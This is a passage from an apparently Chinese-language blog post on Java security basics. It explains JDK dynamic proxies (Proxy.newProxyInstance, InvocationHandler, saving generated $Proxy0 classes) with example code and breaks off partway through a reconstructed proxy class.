<p><strong>动态代理</strong>则在<strong>运行时</strong>按需生成代理类：方法调用会被统一转发到一个拦截器（如 <code>InvocationHandler</code>&#x2F;<code>MethodInterceptor</code>），由拦截器决定是否、何时以及如何调用目标方法，并在调用前后织入日志、鉴权、事务、限流等横切逻辑，从而显著减少样板代码并提升复用与灵活性。</p>
<p>JDK 动态代理只适用于<strong>接口</strong>；若要代理<strong>具体类</strong>，通常使用 CGLIB&#x2F;Byte Buddy（不能代理 <code>final</code> 类&#x2F;方法，也不能拦截构造器或静态方法）。</p>

    </div>
  </div>

<h3 id="基于接口的动态代理"><a href="#基于接口的动态代理" class="headerlink" title="基于接口的动态代理"></a>基于接口的动态代理</h3><p><strong>基于接口的动态代理</strong>使用 JDK 提供的 <code>java.lang.reflect.Proxy</code> 类和 <code>InvocationHandler</code> 接口创建代理。代理对象通过实现一个或多个接口，在运行时动态生成并委托给 <code>InvocationHandler</code> 进行方法调用。适用于目标类实现了接口的场景。</p>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>为了生成代理类，我们使用 Java 提供的 <code>Proxy.newProxyInstance</code> 方法，该方法的原型如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>newProxyInstance</code> 方法动态生成代理类时，依赖于以下三个参数：</p>
<ul>
<li><p><strong>被代理类的类加载器 <code>loader</code></strong> </p>
<ul>
<li>代理类本身是 <strong>动态生成的</strong>，并且需要被 <strong>加载到 JVM 中</strong>。</li>
<li>这个 <code>loader</code> 参数传入的是 <strong>目标类（被代理类）</strong> 的类加载器，告诉 JVM 应该使用哪个类加载器来加载这个代理类。</li>
<li>如果 <code>loader</code> 设置为 <code>null</code>，代理类将由调用该方法的类的类加载器加载。通常情况下，我们传入的是目标对象的类加载器（<code>target.getClass().getClassLoader()</code>）。</li>
</ul>
</li>
<li><p><strong>被代理类实现的接口 <code>interfaces</code></strong></p>
<ul>
<li>生成的代理类将实现被代理类的接口。</li>
<li>这个 <code>interfaces</code> 是一个 <strong>接口数组</strong>，因为一个类可以实现多个接口，所以动态代理类也需要实现多个接口，从而能够代理多个接口的方法。</li>
<li>该数组包含了目标类 <strong>实现的所有接口</strong>，以便生成的代理类能够符合这些接口的契约，确保我们能够调用接口中定义的方法。</li>
</ul>
</li>
<li><p><strong><code>InvocationHandler</code> 接口的实现 <code>h</code></strong></p>
<ul>
<li><p><code>InvocationHandler</code> 是动态代理的核心，负责 <strong>拦截和转发方法调用</strong>。</p>
</li>
<li><p>每当代理对象的方法被调用时，<code>InvocationHandler</code> 的 <code>invoke()</code> 方法会被触发。</p>
</li>
<li><p>这个 <code>h</code> 参数就是一个实现了 <code>InvocationHandler</code> 接口的对象，它定义了代理对象的方法调用应该如何处理。</p>
</li>
<li><p>通过 <code>InvocationHandler</code>，我们可以在方法执行前或执行后进行一些自定义操作，比如日志记录、权限验证、性能监控等。</p>
</li>
</ul>
</li>
</ul>
<p>这几个参数的关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/dynamic_proxy.svg"
                      alt="dynamic_proxy"
                ></p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>由于 <code>Proxy.newProxyInstance</code> 需要三个参数（类加载器、接口数组、调用处理器），我们可以在 <code>InvocationHandler</code> 的实现类 <code>ServiceInvocationHandler</code> 中**保存被代理对象 <code>realService</code>**：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ServiceInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object realService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceInvocationHandler</span><span class="params">(Object realService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.realService = realService;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样我们就可以直接推导出 <code>Proxy.newProxyInstance</code> 所需的三个参数：</p>
<ul>
<li><strong>loader（类加载器）</strong>：优先使用线程上下文类加载器（TCCL），退而求其次用 <code>realService.getClass().getClassLoader()</code>。</li>
<li><strong>interfaces（接口数组）</strong>：使用 <code>realService.getClass().getInterfaces()</code> 自动收集目标对象已实现的接口。</li>
<li><strong>h（调用处理器）</strong>：就是当前的 <code>this</code>（<code>ServiceInvocationHandler</code> 实例）。</li>
</ul>
<p>因此我们只需定义一个 <code>getProxyInstance()</code> 工厂方法，就能可靠地生成代理对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 封装获取动态代理对象的方法</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getProxyInstance</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) Proxy.newProxyInstance(</span><br><span class="line">            realService.getClass().getClassLoader(),</span><br><span class="line">            realService.getClass().getInterfaces(),</span><br><span class="line">            <span class="built_in">this</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>在调用被代理类 <code>RealService</code> 的方法时，代理类会将调用转发至 <code>InvocationHandler</code> 接口的实现类 <code>ServiceInvocationHandler</code> 的 <code>invoke</code> 方法上。该方法的原型如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong><code>proxy</code></strong> ：是“代理实例本身”（也就是 <code>$ProxyN</code> 对象），<strong>不是</strong>被代理的真实对象。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在 <code>invoke</code> 里不要再通过 <code>proxy</code> 去调用业务方法（会**递归进入 <code>invoke</code>**）；需要调用真实实现，应当保存并调用你自己的 <code>realService</code>。</p>

    </div>
  </div>
</li>
<li><p><strong><code>method</code></strong> ：调用的被代理的方法对应的 <code>Method</code> 对象。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>这里直接提供了被代理方法的 <code>Method</code> 对象，因此动态代理的用法就十分灵活了。例如 MyBatis 框架就利用在这里利用 <code>Method</code> 对象反射解析接口中的 SQL 语句注解，然后根据传入的参数执行 SQL 语句并返回，而没有使用代理原本的功能，即 MyBatis 代理的接口没有实现类。</p>

    </div>
  </div>
</li>
<li><p><strong><code>args</code></strong> ：调用的被代理的方法时传入的参数列表。</p>
</li>
</ul>
<p>完整的动态代理示例代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 示例目标接口：JDK 动态代理只支持“基于接口”的代理</span></span><br><span class="line"><span class="comment"> * 若没有接口，需要使用 CGLIB/Byte Buddy 等“基于子类”的代理方案</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 业务实现类：实现了 Service 接口，因而可被 JDK 动态代理 */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RealService</span> <span class="keyword">implements</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Performing service...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代理的“调用处理器”：所有对代理对象的方法调用，都会被转发到这里的 invoke(...)</span></span><br><span class="line"><span class="comment"> * 你可以在这里织入日志、鉴权、事务、重试、限流、指标埋点等横切逻辑</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ServiceInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">// 被代理的真实对象（也常叫 target / delegate）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object realService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceInvocationHandler</span><span class="params">(Object realService)</span> &#123;</span><br><span class="line">        <span class="comment">// 实际项目中可加空指针校验；这里保持示例简洁</span></span><br><span class="line">        <span class="built_in">this</span>.realService = realService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 每次调用“代理对象”的任意方法（包含接口方法与 Object 的 equals/hashCode/toString），都会进入本方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy  代理实例本身（$ProxyN 对象），不是 realService</span></span><br><span class="line"><span class="comment">     *               注意：不要用 proxy 再反射调用方法，否则会递归再次进入 invoke</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method 接口上声明的方法（或 Object 的 equals/hashCode/toString）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args   实参列表；无参方法时为 null（而不是长度为 0 的数组）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 目标方法返回值；void 方法返回 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable 可以抛出任意异常；若抛出未在接口方法签名中声明的受检异常，</span></span><br><span class="line"><span class="comment">     *                   由生成的代理方法包装成 UndeclaredThrowableException 再抛出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// —— 调用前（前置逻辑）——</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Before method: &quot;</span> + method.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 正确做法：在“真实对象”上执行；切勿在 proxy 上执行（会导致无限递归）</span></span><br><span class="line">        <span class="comment">// 这里 method 虽然“声明于接口”，但反射调用会按 Java 的虚分派规则，最终落到真实实现类的方法体上</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(realService, args);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// —— 调用后（后置逻辑）——</span></span><br><span class="line">        System.out.println(<span class="string">&quot;After  method: &quot;</span> + method.getName());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 封装：生成一个实现了 realService 所有接口的“动态代理对象”</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Proxy.newProxyInstance 的三个关键参数：</span></span><br><span class="line"><span class="comment">     *  1) ClassLoader：通常使用目标类的类加载器；在容器/模块化场景中，优先线程上下文类加载器（TCCL）更稳妥</span></span><br><span class="line"><span class="comment">     *  2) interfaces：代理要实现的接口数组（JDK 动态代理“只能代理接口”，至少一个）</span></span><br><span class="line"><span class="comment">     *  3) handler：调用处理器（this）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getProxyInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 若 realService 未实现任何接口，此处会抛出 IllegalArgumentException（由 Proxy 校验）</span></span><br><span class="line">        <span class="comment">// 生产代码可在这里主动检测并给出更友好的提示</span></span><br><span class="line">        <span class="keyword">return</span> (T) Proxy.newProxyInstance(</span><br><span class="line">                <span class="comment">// 类加载器：也可改为 Thread.currentThread().getContextClassLoader() 更通用</span></span><br><span class="line">                realService.getClass().getClassLoader(),</span><br><span class="line">                <span class="comment">// 要实现的接口列表：这里直接取目标类已实现的全部接口</span></span><br><span class="line">                realService.getClass().getInterfaces(),</span><br><span class="line">                <span class="comment">// 调用处理器：当前对象</span></span><br><span class="line">                <span class="built_in">this</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 演示入口：创建代理 → 通过代理调用方法 → 调用前后会打印日志 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 真实业务对象</span></span><br><span class="line">        <span class="type">RealService</span> <span class="variable">realService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealService</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 组装调用处理器（把真实对象传进去以便委派）</span></span><br><span class="line">        <span class="type">ServiceInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceInvocationHandler</span>(realService);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建“实现了 Service 接口”的代理对象（$ProxyN）</span></span><br><span class="line">        <span class="type">Service</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> handler.getProxyInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用代理方法：会先进入 ServiceInvocationHandler#invoke，再反射调用到 RealService#perform</span></span><br><span class="line">        proxyInstance.perform();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// —— 额外说明 —— </span></span><br><span class="line">        <span class="comment">// equals/hashCode/toString 也会被代理并进入 invoke：</span></span><br><span class="line">        <span class="comment">//   可在 invoke 中用 if (method.getDeclaringClass() == Object.class) 分支单独处理自定义语义</span></span><br><span class="line">        <span class="comment">// 无参方法时 args == null，别误判为空数组</span></span><br><span class="line">        <span class="comment">// 需要调试生成的代理字节码，可在创建代理前开启：</span></span><br><span class="line">        <span class="comment">//   JDK 8  ：-Dsun.misc.ProxyGenerator.saveGeneratedFiles=true</span></span><br><span class="line">        <span class="comment">//   JDK 9+ ：-Djdk.proxy.ProxyGenerator.saveGeneratedFiles=true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>JDK 动态代理类是在运行时由 JVM 根据“接口数组 + 调用处理器”<strong>动态生成并 <code>defineClass</code></strong> 的。默认这些类只存在于内存中，不会落盘。如果想把生成的 <code>$ProxyN</code> 写成 <code>.class</code> 文件，JDK 内置了<strong>调试用开关</strong>：</p>
<p>将系统属性 <code>sun.misc.ProxyGenerator.saveGeneratedFiles</code> 设置为 <code>true</code> 就可以将生成的动态代理类保存在当前目录下。</p>
<ul>
<li><strong>JDK 8 及之前</strong>：<code>sun.misc.ProxyGenerator.saveGeneratedFiles=true</code></li>
<li><strong>JDK 9 及之后</strong>：<code>jdk.proxy.ProxyGenerator.saveGeneratedFiles=true</code>（注意前缀变了）</li>
</ul>
<p>我们可以通过下面两种方式设置系统属性：</p>
<ul>
<li><p>启动参数：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JDK 8 及之前</span></span><br><span class="line">java -Dsun.misc.ProxyGenerator.saveGeneratedFiles=<span class="literal">true</span>  ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># JDK 9+（含 11/17/21 等）</span></span><br><span class="line">java -Djdk.proxy.ProxyGenerator.saveGeneratedFiles=<span class="literal">true</span>  ...</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>代码里设置（务必在创建任何代理之前）：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// JDK 9+</span></span><br><span class="line">    System.setProperty(<span class="string">&quot;jdk.proxy.ProxyGenerator.saveGeneratedFiles&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如需兼容 JDK 8，可同时设置老属性（多设置一个不影响）：</span></span><br><span class="line">    System.setProperty(<span class="string">&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...随后再创建动态代理对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<blockquote>
<p>建议优先用 <strong>JVM 启动参数 <code>-D</code></strong> 的方式，因为很多框架会很早创建代理；若在代码里再 <code>System.setProperty(...)</code>，<strong>可能已经来不及</strong>。</p>
</blockquote>
<p>设置上述系统属性后，Java 会在<strong>当前工作目录</strong>（<code>System.getProperty(&quot;user.dir&quot;)</code>）下，按包名创建子目录，并在其中创建 <code>$Proxy0</code> 类的类文件。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 这是 JDK 动态代理在运行期生成的类的“等价还原”示例：</span></span><br><span class="line"><span class="comment"> * - 继承 Proxy，持有受保护字段 h（InvocationHandler）</span></span><br><span class="line"><span class="comment"> * - 实现目标接口 Service</span></span><br><span class="line"><span class="comment"> * - 每个方法都会把调用转发给 h.invoke(proxy, method, args)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * - 实际运行时类名通常形如 $Proxy0/$Proxy1...，包名在 JDK 8 为 com.sun.proxy，</span></span><br><span class="line"><span class="comment"> *   在 JDK 9+ 常见 jdk.proxyN（N 为编号）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">$Proxy0</span> <span class="keyword">extends</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">Service</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---- 缓存 Method 对象（所有代理实例共享，避免每次反射查找开销）----</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method mEquals;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method mToString;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method mHashCode;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method mPerform;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造器：把 InvocationHandler 交给父类 Proxy 存入受保护字段 h。</span></span><br><span class="line"><span class="comment">     * 这里不声明 throws；失败会在调用阶段通过 UndeclaredThrowableException 包装。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> $Proxy0(InvocationHandler h) &#123;</span><br><span class="line">        <span class="built_in">super</span>(h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---- Object 的三大方法同样会被转发到 InvocationHandler ----</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 注意返回的是装箱类型，需要拆箱为 boolean</span></span><br><span class="line">            <span class="keyword">return</span> ((Boolean) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, mEquals, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;)).booleanValue();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex; <span class="comment">// 运行时异常和 Error 直接透传</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            <span class="comment">// 其他受检异常统一包装，因为 equals 没有 throws 声明</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (String) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, mToString, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ((Integer) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, mHashCode, <span class="literal">null</span>)).intValue();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---- Service 接口方法，同样通过 InvocationHandler 分发 ----</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span 